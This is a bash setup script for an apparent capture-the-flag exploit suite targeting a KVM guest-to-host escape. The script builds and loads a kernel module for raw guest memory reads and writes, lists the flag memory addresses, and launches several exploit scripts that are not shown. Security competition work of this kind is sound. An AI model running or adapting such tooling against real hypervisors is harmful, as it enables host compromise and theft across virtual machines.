#!/bin/bash
# KVM CTF Exploit Suite - Complete Setup Script

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${BLUE}"
    echo "╔═══════════════════════════════════════════════════════╗"
    echo "║     KVM CTF Guest-to-Host Escape Exploit Suite       ║"
    echo "║              IVSHMEM + Direct Access                 ║"
    echo "╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script must be run as root (in guest VM)"
        exit 1
    fi
}

check_dependencies() {
    print_info "Checking dependencies..."
    
    local missing_deps=()
    
    # Check for build tools
    if ! command -v gcc &> /dev/null; then
        missing_deps+=("gcc")
    fi
    
    if ! command -v make &> /dev/null; then
        missing_deps+=("make")
    fi
    
    if ! command -v python3 &> /dev/null; then
        missing_deps+=("python3")
    fi
    
    # Check for kernel headers
    if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
        print_warning "Kernel headers not found for $(uname -r)"
        missing_deps+=("linux-headers-$(uname -r)")
    fi
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        print_error "Missing dependencies: ${missing_deps[*]}"
        print_info "Install with: apt-get install ${missing_deps[*]}"
        exit 1
    fi
    
    print_success "All dependencies found"
}

build_module() {
    print_info "Building kernel module..."
    make clean &> /dev/null || true
    make module
    
    if [ -f "kvm_probe_drv.ko" ]; then
        print_success "Kernel module built successfully"
    else
        print_error "Failed to build kernel module"
        exit 1
    fi
}

build_userspace() {
    print_info "Building userspace tools..."
    make userspace
    
    if [ -f "kvm_prober" ] && [ -f "kvm_direct_exploit" ]; then
        print_success "Userspace tools built successfully"
    else
        print_error "Failed to build userspace tools"
        exit 1
    fi
}

load_module() {
    print_info "Loading kernel module..."
    
    # Unload if already loaded
    rmmod kvm_probe_drv 2>/dev/null || true
    
    # Load module
    insmod kvm_probe_drv.ko
    
    # Wait for device
    sleep 1
    
    # Check for device
    if [ -e "/dev/kvm_probe_dev" ] || [ -e "/dev/kvm_probe_drv" ]; then
        print_success "Module loaded, device created"
        ls -la /dev/kvm_probe* 2>/dev/null
    else
        print_error "Module loaded but device not found"
        dmesg | tail -5
        exit 1
    fi
}

install_tools() {
    print_info "Installing userspace tools..."
    
    cp kvm_prober /usr/local/bin/
    chmod +x /usr/local/bin/kvm_prober
    
    cp kvm_direct_exploit /usr/local/bin/
    chmod +x /usr/local/bin/kvm_direct_exploit
    
    # Make Python scripts executable
    chmod +x *.py 2>/dev/null || true
    
    print_success "Tools installed to /usr/local/bin/"
}

show_pci_info() {
    print_info "Scanning for PCI devices and IVSHMEM..."
    echo ""
    
    # Show all PCI devices
    echo -e "${BLUE}PCI Devices:${NC}"
    lspci | head -10
    echo ""
    
    # Check for IVSHMEM specifically
    echo -e "${BLUE}IVSHMEM Devices (vendor 1af4):${NC}"
    if lspci -d 1af4: &>/dev/null; then
        lspci -d 1af4: -v
        print_success "IVSHMEM devices found!"
    else
        print_warning "No IVSHMEM devices found (vendor 1af4)"
    fi
    echo ""
    
    # Show BARs for first few devices
    echo -e "${BLUE}BAR Information (first 3 devices):${NC}"
    count=0
    for dev in /sys/bus/pci/devices/*/resource; do
        if [ $count -ge 3 ]; then break; fi
        bdf=$(basename $(dirname $dev))
        echo "Device: $bdf"
        head -3 $dev 2>/dev/null | while IFS= read -r line; do
            if [ -n "$line" ]; then
                parts=($line)
                start=${parts[0]}
                end=${parts[1]}
                flags=${parts[2]}
                if [ "$start" != "0x0000000000000000" ]; then
                    size=$((16#${end} - 16#${start} + 1))
                    is_io=$((16#${flags} & 0x1))
                    if [ $is_io -eq 1 ]; then
                        type="I/O"
                    else
                        type="MMIO"
                    fi
                    echo "  $start - $end ($type, size: 0x$(printf '%x' $size))"
                fi
            fi
        done
        count=$((count + 1))
        echo ""
    done
}

show_targets() {
    echo ""
    print_info "CTF Target Information:"
    echo ""
    echo -e "${BLUE}Target 1: Memory Write Flag (250k points)${NC}"
    echo "  Physical Address: 0x64279a8"
    echo "  Virtual Address:  0xffffffff826279a8"
    echo "  Required Value:   0xdeadbeef41424344"
    echo ""
    echo -e "${BLUE}Target 2: Memory Read Flag (50-100k points)${NC}"
    echo "  Physical Address: 0x695ee10"
    echo "  Virtual Address:  0xffffffff82b5ee10"
    echo "  Action: Read flag content"
    echo ""
    echo -e "${BLUE}Target 3: RCE Flag (250k points)${NC}"
    echo "  File Path: /root/rce_flag"
    echo "  Action: Read host file from guest"
    echo ""
}

run_basic_tests() {
    print_info "Running basic functionality tests..."
    echo ""
    
    # Test device access
    echo -e "${BLUE}Test 1: Device Access${NC}"
    if kvm_prober getkaslr &>/dev/null; then
        print_success "KASLR detection works"
    else
        print_warning "KASLR detection failed (may be expected)"
    fi
    
    # Test GPA write
    echo -e "${BLUE}Test 2: GPA Write${NC}"
    if kvm_prober writegpa 1000 deadbeefcafebabe &>/dev/null; then
        print_success "GPA write works"
    else
        print_warning "GPA write failed"
    fi
    
    # Test GPA read
    echo -e "${BLUE}Test 3: GPA Read${NC}"
    if kvm_prober readgpa 1000 8 &>/dev/null; then
        print_success "GPA read works"
    else
        print_warning "GPA read failed"
    fi
    
    echo ""
}

run_exploit() {
    local exploit_type=$1
    
    case $exploit_type in
        "hybrid")
            print_info "Running hybrid IVSHMEM + Direct exploit..."
            python3 hybrid_kvm_exploit.py
            ;;
        "ivshmem")
            print_info "Running IVSHMEM-focused exploit..."
            python3 ivshmem_kvm_exploit.py
            ;;
        "direct")
            print_info "Running direct access exploit..."
            python3 comprehensive_kvm_exploit.py
            ;;
        "c")
            print_info "Running C exploit..."
            ./kvm_direct_exploit
            ;;
        "all")
            print_info "Running all exploit methods..."
            echo ""
            echo "=== Hybrid Exploit ==="
            python3 hybrid_kvm_exploit.py || true
            echo ""
            echo "=== IVSHMEM Exploit ==="
            python3 ivshmem_kvm_exploit.py || true
            echo ""
            echo "=== Direct Exploit ==="
            python3 comprehensive_kvm_exploit.py || true
            echo ""
            echo "=== C Exploit ==="
            ./kvm_direct_exploit || true
            ;;
        *)
            print_error "Unknown exploit type: $exploit_type"
            exit 1
            ;;
    esac
}

show_usage() {
    echo "Usage: $0 [command]"
    echo ""
    echo "Commands:"
    echo "  install        - Build and install everything"
    echo "  build          - Only build (no install)"
    echo "  load           - Only load module"
    echo "  test           - Run basic tests"
    echo "  info           - Show PCI/IVSHMEM information"
    echo "  exploit [type] - Run exploit (hybrid|ivshmem|direct|c|all)"
    echo "  uninstall      - Remove module and tools"
    echo "  clean          - Clean build artifacts"
    echo "  help           - Show this help"
    echo ""
    echo "Quick Start:"
    echo "  sudo ./setup.sh install    # Install everything"
    echo "  sudo ./setup.sh info        # Check for IVSHMEM"
    echo "  sudo ./setup.sh exploit all # Run all exploits"
}

main() {
    print_banner
    
    case "${1:-install}" in
        "install")
            check_root
            check_dependencies
            build_module
            build_userspace
            load_module
            install_tools
            show_pci_info
            show_targets
            run_basic_tests
            print_success "Installation complete!"
            echo ""
            print_info "Next steps:"
            echo "  1. Run: sudo ./setup.sh info       # Check IVSHMEM devices"
            echo "  2. Run: sudo ./setup.sh exploit all # Try all exploits"
            ;;
        
        "build")
            check_dependencies
            build_module
            build_userspace
            print_success "Build complete!"
            ;;
        
        "load")
            check_root
            load_module
            ;;
        
        "test")
            check_root
            run_basic_tests
            ;;
        
        "info")
            show_pci_info
            show_targets
            ;;
        
        "exploit")
            check_root
            run_exploit "${2:-hybrid}"
            ;;
        
        "uninstall")
            check_root
            print_info "Uninstalling..."
            rmmod kvm_probe_drv 2>/dev/null || true
            rm -f /usr/local/bin/kvm_prober
            rm -f /usr/local/bin/kvm_direct_exploit
            print_success "Uninstall complete!"
            ;;
        
        "clean")
            print_info "Cleaning..."
            make clean &>/dev/null || true
            print_success "Clean complete!"
            ;;
        
        "help")
            show_usage
            ;;
        
        *)
            print_error "Unknown command: $1"
            show_usage
            exit 1
            ;;
    esac
}

main "$@"